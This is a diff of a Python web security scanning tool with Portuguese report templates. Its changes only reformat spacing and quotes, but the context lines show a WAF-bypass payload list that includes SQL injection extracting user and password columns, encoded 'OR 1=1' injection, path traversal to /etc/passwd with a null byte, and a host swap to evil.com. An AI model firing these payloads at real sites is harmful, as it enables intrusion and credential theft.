@@ -105,7 +105,7 @@ def waf_bypass_payloads(base_url):
             "concat(user,0x3a,pass)from%20users--"
         ),
         f"{base_url}?param=%2527%2520OR%25201%253D1",
-        f"{base_url}#{'A'*9999}",
+        f"{base_url}#{'A' * 9999}",
         f"{base_url}/{'../' * 5}etc/passwd%00.jpg",
         f"{base_url}?id=1&id='&debug=1&test='",
         f"{base_url.replace(u.netloc, 'evil.com')}",
@@ -225,7 +225,9 @@ def hyper_osint(target):
             "chApi": chApi_flat,
             "hashes": hashes,
             "subdomains": live_subs,
-            "comments_count": len(re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)),
+            "comments_count": len(
+                re.findall(r"<!--(.*?)-->", r.text, re.DOTALL)
+            ),
             "server": r.headers.get("Server", "Unknown"),
             "x_powered_by": r.headers.get("X-Powered-By", "None"),
         }
@@ -528,9 +530,9 @@ def gerar_relatorios(target_url):
 <body>
     <h1>Relatório de Auditoria de Segurança</h1>
     <div class="card">
-        <p><strong>Alvo:</strong> {AUDIT_REPORT['target']}</p>
-        <p><strong>WAF Detectado:</strong> {AUDIT_REPORT['waf_detected']}</p>
-        <p><strong>Servidor Web:</strong> {AUDIT_REPORT['osint'].get('server', 'Desconhecido')}</p>
+        <p><strong>Alvo:</strong> {AUDIT_REPORT["target"]}</p>
+        <p><strong>WAF Detectado:</strong> {AUDIT_REPORT["waf_detected"]}</p>
+        <p><strong>Servidor Web:</strong> {AUDIT_REPORT["osint"].get("server", "Desconhecido")}</p>
     </div>
     <div class="card">
         <h2>Vulnerabilidades Críticas / Diretórios Expostos</h2>
@@ -540,7 +542,7 @@ def gerar_relatorios(target_url):
     </div>
     <div class="card">
         <h2>Portas Abertas</h2>
-        <p>{len(AUDIT_REPORT['ports'])} portas abertas detectadas.</p>
+        <p>{len(AUDIT_REPORT["ports"])} portas abertas detectadas.</p>
     </div>
 </body>
 </html>
